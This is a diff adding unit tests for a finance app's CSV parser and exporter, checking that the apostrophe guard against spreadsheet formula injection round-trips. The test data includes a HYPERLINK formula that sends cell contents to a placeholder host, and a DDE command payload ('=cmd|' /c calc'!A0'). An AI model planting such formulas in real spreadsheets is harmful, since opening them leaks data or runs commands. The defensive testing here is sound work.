@@ -510,3 +510,40 @@ test('deriveBalances: rows without a balance (and files with none) yield nothing
   assert.deepEqual(deriveBalances([{ date: '2026-01-01' }, { date: '2026-01-02', balance: null }]), []);
   assert.deepEqual(deriveBalances([]), []);
 });
+
+// ── Spreadsheet formula guard, round trip ────────────────────────────────────
+// The CSV exporter prefixes an apostrophe onto a text cell that would otherwise
+// be read as a formula (services/txExport.js csvText). This app imports its own
+// exports, so the parser has to undo exactly that and nothing more.
+
+test('parseDelimited: strips the exporter\'s formula-guard apostrophe', () => {
+  // Quoted, because the field contains a quote — which is how the exporter
+  // actually writes it (csvField wraps on ", comma or newline).
+  const csv = 'Date,Description,Amount\r\n'
+    + '2026-02-01,"\'=HYPERLINK(""http://x/""&A1)",-12.50\r\n';
+  const { rows } = parseDelimited(csv, ',');
+  assert.equal(rows[0][1], '=HYPERLINK("http://x/"&A1)');
+});
+
+test('parseDelimited: keeps an apostrophe no exporter added', () => {
+  // The trigger character is what identifies a guard. A payee that genuinely
+  // starts with an apostrophe must survive every pass through the importer,
+  // and an unconditional strip would eat one character per pass.
+  const { rows } = parseDelimited("Date,Description\r\n2026-03-01,'74 Camaro fund\r\n", ',');
+  assert.equal(rows[0][1], "'74 Camaro fund");
+});
+
+test('export → import round-trips a description that looks like a formula', () => {
+  const { exportHeader, exportBody } = require('../services/txExport');
+  const description = '=cmd|\' /c calc\'!A0';
+  const csv = exportHeader('csv', null) + exportBody('csv', [{
+    id: 1, date: '2026-04-01', description, amount: 3.5,
+    notes: '', tx_type: 'expense', category_name: null,
+  }]);
+  // Escaped on the way out. No quoting here: the value holds no comma, quote
+  // or newline, so csvField leaves it bare and only the guard applies.
+  assert.ok(csv.includes(",'=cmd|' /c calc'!A0,"), csv);
+  // ...and identical on the way back in.
+  const { rows } = parseDelimited(csv, ',');
+  assert.equal(rows[0][1], description);
+});
